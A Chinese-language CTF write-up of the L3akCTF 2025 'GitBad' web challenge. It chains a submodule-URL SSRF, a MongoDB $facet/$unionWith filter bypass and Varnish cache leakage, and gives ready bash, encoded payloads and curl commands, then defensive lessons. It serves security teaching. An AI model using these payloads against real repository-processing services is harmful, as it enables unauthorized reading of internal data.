# L3akCTF 2025 GitBad Writeup

## 题目简述

GitBad 允许登录用户上传不超过 1 MB 的 ZIP 仓库。服务端解压后执行：

```text
git submodule update --init --recursive
```

站点还有一个仅限本机访问的 MongoDB 聚合搜索接口，以及会缓存 `.js`、`.css` 路径的 Varnish。决定性障碍是把 Git submodule 盲 SSRF、嵌套聚合注入和 Web cache 串起来，因此本文按 Web 归档。

## 解题过程

### 通过恶意 submodule 触发本机请求

上传检查会阻止 ZIP 路径穿越、符号链接和 `.git/config` 中的 `fsmonitor`，却没有限制 submodule URL。构造一个真实 Git 仓库，并把 submodule URL 指向：

```text
http://127.0.0.1/api/search.js?debug=true&filter=<URL编码的JSON>#
```

末尾的 `#` 很重要。Git 在探测远程仓库时会给 URL 追加 `/info/refs?service=git-upload-pack` 等后缀；把 `#` 放在基础 URL 末尾后，这些后缀成为 fragment，不会发送给 HTTP 服务端。

仓库除 `.gitmodules` 外，还需要一个 gitlink 索引项，才能让 `git submodule update` 真正处理该路径：

```bash
git init exploit-repo
cd exploit-repo
git config user.email solver@example.invalid
git config user.name solver
echo x > file.txt
git add file.txt
git commit -m init

empty_commit=$(git rev-parse HEAD)

cat > .gitmodules <<'EOF'
[submodule "leak"]
    path = leak
    url = http://127.0.0.1/api/search.js?debug=true&filter=FILTER#
EOF

git add .gitmodules
printf "160000 commit %s\tleak\n" "$empty_commit" |
  git update-index --index-info
git commit -m submodule
```

将 `FILTER` 替换为后文 JSON 的 URL 编码，再连同 `.git` 目录一起打包上传。子模块 clone 会从应用容器内部向 `127.0.0.1` 发出请求。

### 绕过 MongoDB 操作符过滤

搜索接口只检查过滤对象的顶层键。虽然 `$unionWith` 在禁用列表中，`$facet` 没有被禁用；深度限制函数遇到 list 又会原样返回，不再递归检查其中元素。

因此可把危险 stage 藏在 `$facet` 的子流水线中：

```json
{
  "$facet": {
    "flag": [
      {
        "$unionWith": "config"
      }
    ]
  }
}
```

应用原本在 `users` 集合上执行聚合。`$unionWith: "config"` 会把保存配置和 flag 的 `config` 集合并入 `flag` 数组，响应中可看到配置文档的 `value` 字段。

对应 URL 编码后的 filter 为：

```text
%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D
```

完整 SSRF 路径为：

```text
/api/search.js?debug=true&filter=%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D
```

`.js` 并不是静态文件；Flask 同时把 `/api/search.<ext>` 路由到相同 handler。

### 从 Varnish 取回盲 SSRF 响应

Varnish 对以 `.js` 或 `.css` 结尾、可带 query 的任意 URL 进入缓存，缓存键包含完整 URL 和 `Accept`：

```vcl
if (req.url ~ "\.(js|css)(\?.*)?$") {
    hash_data(req.url);
    hash_data(req.http.accept);
}
```

Git 发起的 SSRF 从 `127.0.0.1` 到达 Varnish，`X-Forwarded-For` 被重写为本地地址，所以通过搜索接口的 localhost 检查。后端返回的聚合结果被缓存 10 秒，且 Varnish 会删除 `Set-Cookie` 和 `Vary`。

上传触发后立即从外部请求完全相同的路径，并保持相同的 `Accept: */*`：

```bash
curl -H 'Accept: */*' \
  'http://target/api/search.js?debug=true&filter=%7B%22%24facet%22%3A%7B%22flag%22%3A%5B%7B%22%24unionWith%22%3A%22config%22%7D%5D%7D%7D'
```

外部请求会在到达 Flask 之前命中缓存，因此不再执行 localhost 检查。响应的 `flag` 数组中得到：

```text
L3AK{5k1ll_15sU3_5p0773d_Y0U_N33D_B3773R_D3V_T34M!!!}
```

## 方法总结

自动处理不可信 Git 仓库不仅有 hooks 和配置风险，submodule URL 本身就是网络访问原语。服务端若必须更新 submodule，应限制协议和目标地址，并在隔离、无内网访问的环境执行，不能只过滤 `fsmonitor`。

MongoDB 聚合过滤也不能只检查顶层键，stage 可以嵌套在 `$facet` 等结构中。最后，缓存规则按文件扩展名判断响应是否公开，把动态 `/api/search.js` 当成静态资源，令盲 SSRF 结果跨信任边界泄露。缓存策略应由明确路由和响应语义决定，而不是依赖 URL 后缀。
